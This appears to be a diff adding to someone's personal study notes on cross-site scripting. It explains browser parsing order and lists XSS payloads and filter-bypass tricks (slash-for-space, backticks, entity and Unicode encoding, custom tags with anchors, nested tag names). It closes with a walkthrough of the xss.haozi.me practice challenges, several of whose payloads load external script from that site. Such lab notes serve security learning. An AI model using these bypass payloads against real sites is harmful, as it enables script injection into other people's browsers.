@@ -2176,6 +2176,54 @@ The attacker can insert a fake login form into the page using DOM manipulation, 
 
 
 
+### 代码解析
+
+
+
+#### 1.DOM树的构建与HTML标记的解析
+
+当浏览器收到来自服务端的代码后，会先进行DOM树的构建与HTML标记的解析。
+
+当解析到`<img>`标签时，浏览器会立即发起图像资源的请求，并开始下载图像。下载过程是异步进行的，即浏览器会继续解析和渲染HTML内容，而不会等待图像下载完成。
+
+![image-20240506160116254](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506160116254.png)
+
+
+
+#### 2.js代码解析
+
+在遇到JavaScript代码时，HTML解析器会暂停解析，并将控制权交给JavaScript引擎，执行JavaScript代码。一旦JavaScript代码执行完毕，HTML解析器会继续解析未解析的HTML内容。
+
+这种行为称为"**阻塞解析**"，因为HTML解析器会等待JavaScript代码执行完毕后才能继续解析后续的HTML内容。这意味着，如果JavaScript代码的执行时间过长，会导致页面加载的延迟。
+
+- 为了改善页面加载性能，可以使用async或defer属性来加载JavaScript文件。
+  - 当使用async属性时，浏览器会异步加载JavaScript文件，并继续解析HTML内容，不会阻塞解析。
+  - 而使用defer属性时，浏览器会异步加载JavaScript文件，但会等到HTML解析完毕后再执行JavaScript代码，不会阻塞解析。
+
+需要注意的是，当JavaScript代码执行时，如果该代码修改了DOM结构或样式，可能会触发浏览器重新构建DOM树和应用样式，从而导致页面的重绘和回流，影响页面的性能。
+
+
+
+- 正常在遇到`<script>`标签时会停止进行HTML解析，进行JavaScript解析。
+
+  当浏览器遇到下面的两类会先进行HTML标记解析然后进行JavaScript解析，当HTML无法解析时就会来将控制权交给JavaScript引擎来执行JavaScript代码，假如JavaScript引擎也无法进行解析，那么这段代码就有问题了。
+
+  - 事件属性，例如`onload`，`onerror`等
+
+  - URL协议，例如`javascript`伪协议等
+
+  这也就是为什么有时候在某个页面插入了XSS弹窗后，假如你不点击你的弹窗的相应的操作，某些元素就无法进行加载。
+
+
+
+#### 3.对CSS代码的解析
+
+在遇到CSS代码时，浏览器不会像JavaScript代码一样去停止HTML标记的解析，相反它会继续进行HTML代码的解析，并且将CSS代码交给CSS引擎来进行处理。
+
+![image-20240506161430159](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506161430159.png)
+
+
+
 ### Actors in an XSS attack
 
 Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise( 破坏 ) their interaction with the application.
@@ -2560,9 +2608,181 @@ Compared to blacklisting, there are **two major benefits of whitelisting:**
 
 
 
+
+
+
+
+
+
+
+
 ## Practises
 
 https://xss.haozi.me/
+
+### xss payload
+
+```html
+<script>alert(1)</script>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<img src onerror=alert(1)>
+<input type=image src onerror=alert(1)>
+<script src="https://xss.haozi.me/j.js"></script>//加载外部js
+<input type=button onclick="alert(1)">//点击按钮
+<input onmouseover=alert(1)>//鼠标指针移动到指定的元素上时执行
+<input onmousemove=alert(1)>//鼠标移动时执行
+......还有其他onmouse系列
+<img src=javascript: onmouseover="alert(1)">//鼠标移动指向图片
+<img src=javascript: onclick="alert(1)">//鼠标点击图片
+```
+
+
+
+
+
+### xss 绕过
+
+https://xz.aliyun.com/t/12890?time__1311=mqmhq%2BxjhiGKDsD7GY0%3DXh1BQ35i%3D4D&alichlgref=https%3A%2F%2Fwww.google.com%2F
+
+#### 空格绕过
+
+空格使用由`/`来进行替代
+
+```
+<img src=x onerror=alert(1)>
+```
+
+修改为：
+
+```
+<img/src=x/onerror=alert(1)>
+```
+
+- `onerror`: This is an event attribute in HTML. It specifies a JavaScript code to be executed if an error occurs while loading the image specified in the `src` attribute.
+-  the `/` character in the `<img>` tag is being used as a separator between the tag name `<img>` and the attribute name `src`. It's essentially closing the tag name and indicating that the `src` attribute follows.
+
+
+
+#### `()`括号绕过
+
+```
+<img src=x onerror=alert(1)>
+```
+
+修改为：
+
+```
+<img src=x onerror=alert`1`>
+```
+
+The use of backticks in JavaScript is for template literals. Template literals allow for embedded expressions and multiline strings. In this case, alert\`1\` is a template literal where the expression \`1` is embedded within the template.
+
+
+
+#### 大小写绕过
+
+由于正则表达式的不严密导致可以使用大小写来进行绕过
+
+解决方案：使用正则表达式忽略大小写的模式
+
+
+
+#### 双写绕过
+
+由于只进行了一次关键字符的替换导致可以被双写绕过
+
+解决方案：循环检测关键字符
+
+
+
+#### 编码绕过
+
+```
+<img src=# onerror=alert('xss')>
+```
+
+经过JavaScript编码（unicode编码）后为
+
+```
+<img src=# onerror=\u0061\u006C\u0065\u0072\u0074('\u0078\u0073\u0073')>
+```
+
+经过HTML实体化编码后为
+
+```
+<img src=# onerror=&#92;&#117;&#48;&#48;&#54;&#49;&#92;&#117;&#48;&#48;&#54;&#67;&#92;&#117;&#48;&#48;&#54;&#53;&#92;&#117;&#48;&#48;&#55;&#50;&#92;&#117;&#48;&#48;&#55;&#52;&#40;&#39;&#92;&#117;&#48;&#48;&#55;&#56;&#92;&#117;&#48;&#48;&#55;&#51;&#92;&#117;&#48;&#48;&#55;&#51;&#39;&#41;>
+```
+
+解决方案：服务端收到数据时先进行HTML/JavaScript解码，剥离危险标签
+
+
+
+##### HTML entities
+
+解码顺序是按照**HTML实体化解码-->JavaScript解码**进行的
+
+
+
+- **HTML实体化解码**
+
+  如果服务器与客户端之间要传输某个特殊字符，像是`<>`，`'`等这类会被当做标签或者属性值等来解析的字符，为了避免歧义就需要使用到HTML实体化编码进行编码
+
+  **HTML编码的几种方式**
+
+  - 别名形式：见[HTML 字符实体 (w3school.com.cn)](https://www.w3school.com.cn/html/html_entities.asp)
+
+  - 十六进制：像`<div>`就会被编码为`&#x003c;&#x0064;&#x0069;&#x0076;&#x003e;`
+
+  - 十进制：上述标签在十进制会被编码为`&#60;&#100;&#105;&#118;&#62;`
+
+
+
+- **JavaScript解码**
+
+  通过JavaScript编码，可以对特殊字符进行转义，防止数据在传输过程中产生语法错误或安全漏洞。例如，对于包含特殊字符（如引号、尖括号等）的数据，可以使用转义字符进行编码，以确保数据的完整性和安全性。
+
+  在HTML进行解析的时候，遇到了`<script>`标签或者事件属性或者URL协议时就会使用到JS编码来对JS代码当中的特殊字符如：`'`，`"`进行编码操作。
+
+  **JS编码方式？**
+
+  以`\uxxxx`，`\UXXXXXXXX`，`\xXX`都是JavaScript编码
+
+  **注意：某些特殊字符不能够进行JavaScript编码，否则浏览器无法进行解析， 如 < > ' " ( )**
+
+
+
+#### 标签绕过
+
+假如所有HTML标签都被过滤，可以尝试自定义标签来进行绕过。
+
+锚点：`#`可以迅速定位到某个id,或者class的位置，只要能让锚点指向到我们自定义标签，然后在自定义标签当中写入`onfocus`事件就可以直接完成XSS。
+
+1. 首先写入一个自定义标签的XSS，注意标注id值，与tabIndex的值
+
+   ```
+   <qweasd id='qweasd' onfocus=alert(1) tabIndex=1>
+   ```
+
+   tabIndex的作用见：[tabindex - HTML（超文本标记语言） | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/tabindex)，主要目的是让自定义标签获得focus
+
+2. 在GET请求最后追加上`锚点+id值`，直接进行访问即可。
+
+   ```
+   https://xxxxx.com?id=<qweasd id='qweasd' onfocus=alert(1) tabIndex=1>#qweasd
+   ```
+
+   假如是存储型XSS可以直接进行加上锚点访问。
+
+解决方案：禁止`<>`的输入或者进行HTML编码
+
+
+
+
+
+
 
 
 
@@ -2574,7 +2794,7 @@ payload : `<script>alert(1)</script>`
 
 
 
-### 01
+### 01 闭合
 
 
 
@@ -2620,7 +2840,7 @@ payload = `</textarea><script>alert(1)</script>`
 
 
 
-### 02
+### 02 闭合
 
 ![image-20240505200032916](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505200032916.png)
 
@@ -2630,7 +2850,9 @@ payload = `"><script>alert(1)</script>`
 
 
 
-### 03
+### 03 `
+
+![image-20240505220339316](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505220339316.png)
 
 正则 `/[()]/g` 意义 ：
 
@@ -2638,4 +2860,280 @@ payload = `"><script>alert(1)</script>`
 - `[()]`：方括号内的字符集，表示匹配其中的任意一个字符。即匹配 `(` 或 `)`
 - `g`：全局标志，表示匹配应该应用于整个字符串，而不是仅仅匹配第一个出现的实例。
 
-![image-20240505220339316](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505220339316.png)
+
+
+方法一： 用 ` 绕过 
+
+```
+payload = <script>alert`1`</script>
+```
+
+
+
+方法二 ：标签属性内用HTML实体编码绕过：
+
+```
+<img src="" onerror=alert&#x28;&#x31;&#x29;>
+```
+
+`&#x28;&#x31;&#x29;`  using **HTML character references** (also known as **HTML entities **) to represent the characters of the JavaScript code `alert(1)`.
+
+- `&#x28;`:   HTML entity for the character `(`.
+- `&#x31;`:HTML entity for the digit `1`.
+- `&#x29;`: HTML entity for the character `)`.
+
+So, when these HTML entities are rendered in a web browser, they will be interpreted as the characters `(`, `1`, and `)`, respectively, resulting in the JavaScript code `alert(1)` being executed. 
+
+
+
+方法三 ：直接引用外部js文件
+
+```
+<script src="https://xss.haozi.me/j.js"></script>
+```
+
+
+
+### 04 html entities
+
+![image-20240506154159276](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506154159276.png)
+
+payload = `<img src="" onerror=alert&#x28;&#x31;&#x29;>`
+
+```html
+<script>window.onerror=eval;throw'=alert\x281\x29'</script>//利用js捕获抛出错误执行弹框，Unicode编码
+<iframe srcdoc="<script>parent.alert&#40;1&#41;</script>">//利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段
+<svg><script>alert&#40;1&#41</script>//svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容
+```
+
+
+
+
+
+### 05  -->
+
+过滤了-->，并将输入放入注释中间但是，
+
+HTML注释支持以下两种方式：
+
+- `<!-- xxx -->`
+- `<!- xxx -!>` 
+
+![image-20240506162755606](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506162755606.png)
+
+payload = `--!><script>alert(1)</script>`
+
+
+
+### 06
+
+```js
+function render (input) {
+  input = input.replace(/auto|on.*=|>/ig, '_')
+  return `<input value=1 ${input} type="text">`
+}
+```
+
+
+
+#### `input.replace(/auto|on.*=|>/ig, '_')`
+
+- `/ ....  /` : mark the start and end of the regular expression literal 
+
+- `ig` : flags for the regex
+
+  - `i` : case-insensitive( 不分大小写 )
+  - `g` : global, replace all occurrences of the matched patterns rather than the first one
+
+- `auto|on.*=|>`
+
+  - `|`: means ` or `. It allows you to specify multiple alternatives, indicating that the pattern should match any one of the alternatives.
+
+    example : `apple|banana|orange` matches either "apple", "banana", or "orange".
+
+    So, in this context, `|` is used to specify different patterns that the regular expression should match. It will match any occurrence of "auto", any attribute starting with "on" followed by any characters until an equal sign ("="), or any greater than symbol (">").
+
+  - `auto`: This matches the string "auto" literally.
+
+  - `on.*=`: This matches any string that starts with "on" followed by any characters (`.*`) until an equal sign (`=`) is encountered. This is often used to match event attributes like `onerror`, `onload`, etc.
+
+
+
+#### **return \`<input value=1 ${input} type="text">`**
+
+- `<input>`:  HTML input element used to create a form control.
+- `value=1`:   sets the initial value of the input field to 1.
+- `${input}`: JavaScript template literal syntax. The `${}` is used for string interpolation, allowing you to embed expressions within a string. In this case, `${input}` represents the value of the JavaScript variable `input`. Whatever value `input` holds will be inserted into the HTML at this position.
+- `type="text"`:  specifies the type of the input field as "text", indicating that the input field is for free-form text input.
+
+
+
+#### backtick in js
+
+In JavaScript, the backtick character ``is used to create template literals. Template literals are string literals allowing embedded expressions.
+
+Template literals are enclosed by the backtick character instead of single or double quotes. They can contain placeholders, indicated by `${}`, which allow you to embed expressions inside a string. When the template literal is evaluated, these placeholders are replaced with the result of evaluating the enclosed expressions.
+
+
+
+#### solve
+
+过滤了auto、大于号>、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。
+
+利用input标签的onmouse系列属性弹框即可：
+
+```
+onmousemove
+=alert(1)
+```
+
+![image-20240506172147134](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506172147134.png)
+
+
+
+**方法二**
+
+input标签的type属性可以设置为image，然后利用类似img标签的套路来弹框即可：
+
+```
+type="image" src="" onerror
+=alert(1)
+```
+
+![image-20240506172128952](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506172128952.png)
+
+
+
+### 07 html fault tolerance
+
+```js
+function render (input) {
+  const stripTagsRe = /<\/?[^>]+>/gi
+
+  input = input.replace(stripTagsRe, '')
+  return `<article>${input}</article>`
+}
+```
+
+- `/<\/?[^>]+>/gi`
+  -  `?` :  quantifier that specifies that the preceding character or group in the regular expression pattern is optional. It means "zero or one occurrence" of the preceding element.
+  - `[^>]+` matches any characters that are not the `>` character. `+`: Matches one or more occurrences of the preceding character class (any character except `>`).
+
+- 过滤了<> 内的所有内容，可利用 容错性 ：少添加最后的 > 也可以执行。
+
+
+
+#### html fault tolerance
+
+HTML has a certain level of fault tolerance or error recovery mechanisms built into its design. These mechanisms are intended to allow web browsers to render web pages even if the HTML markup contains errors or is not well-formed. Some aspects of HTML's fault tolerance include:
+
+1. **Tag and Attribute Omission**: In many cases, web browsers will attempt to infer missing tags or attributes in order to render the page as best as possible. For example, if you forget to close a `<p>` tag, the browser might automatically close it for you at the end of a block of text.
+2. **Parsing Errors**: Browsers will often try to correct parsing errors in the HTML code to render the page correctly. For instance, if you mistakenly write an invalid attribute name, browsers may still render the page without error and ignore the invalid attribute.
+3. **Whitespace Handling**: Browsers typically ignore extra whitespace characters like spaces, tabs, and line breaks between HTML elements. This can help to improve readability in the HTML source code while having no effect on the rendered page.
+4. **Case Insensitivity**: HTML is case-insensitive, meaning that tags and attributes can be written in uppercase, lowercase, or a mix of both, and browsers will interpret them the same way.
+5. **Quotation Marks**: While it's best practice to enclose attribute values in double or single quotation marks (`""` or `''`), browsers will often still render the page correctly even if quotation marks are omitted.
+6. **Browser-Specific Handling**: Different web browsers may handle HTML errors differently. What works in one browser might not work in another. Therefore, it's essential to test web pages across multiple browsers to ensure compatibility.
+
+
+
+#### solve
+
+![image-20240506184222745](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506184222745.png)
+
+payload = `<img src='' onerror=alert(1) ` 末尾加空格或换行或 `//`
+
+
+
+### 08
+
+注意 ：用 `< /style>` 闭合是不行的 ：
+In HTML,  should not have any spaces between  `<`, the tag name, optional `/`, and the `>`. The space between characters could cause the parser to interpret them as **separate entities**, leading to incorrect parsing.
+
+In the case of `</style >`, the space after `</style` is technically allowed but considered extraneous. HTML parsers generally ignore extraneous whitespace, so the browser interprets it as the closing tag for the `<style>` element. 
+
+However, `< /style>` introduces a space between the `<` and `/` characters, which deviates from the expected syntax. HTML parsers treat this as an invalid sequence and may not interpret it as the closing tag for the `<style>` element.
+
+
+
+![image-20240506185225979](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506185225979.png)
+
+payload = `</style ><script>alert(1)</script>` 或加上换行
+
+另一种语法 ：`</style ><body/onload=alert(1)>`
+
+
+
+
+
+### 09
+
+```js
+function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `<script src="${input}"></script>`
+  }
+  return 'Invalid URL'
+}
+```
+
+- `^`:  asserts the start of the line.
+- `https?`: This part matches the string "http" optionally followed by an "s". So, it matches both "http" and "https".
+
+![image-20240506192307210](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506192307210.png)
+
+闭合双引号和 `</script>` , 
+
+payload = `https://www.segmentfault.com"> </script> <img src= '' onerror=alert(1)>`
+
+
+
+### 0A
+
+调用外部 js  
+
+![image-20240506193100822](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506193100822.png)
+
+![image-20240506193357222](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506193357222.png)
+
+payload = `https://www.segmentfault.com.haozi.me/j.js `
+
+这里可以利用URL的@字符的特性来调用外部j.js。
+
+一般的，当我们访问[http://a.com@b.com](http://a.com@b.com/)
+
+实际是访问[http://b.com](http://b.com/)
+
+虽然URL中的特殊符号会被过滤，但过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析执行：
+
+```
+https://www.segmentfault.com@xss.haozi.me/j.js
+```
+
+
+
+### 0B
+
+- html标签大小写无影响；
+- js严格区分大小写。
+
+也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载 j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响：
+
+![image-20240506202501327](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506202501327.png)
+
+payload = `<script src="https://xss.haozi.me/j.js"></script>`
+
+
+
+### 0C 内嵌script 绕过
+
+内嵌script来绕过 
+
+![image-20240506203022242](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240506203022242.png)
+
+payload = `<scrscriptipt src="https://xss.haozi.me/j.js"></scrscriptipt>`
+
+
+
+
+
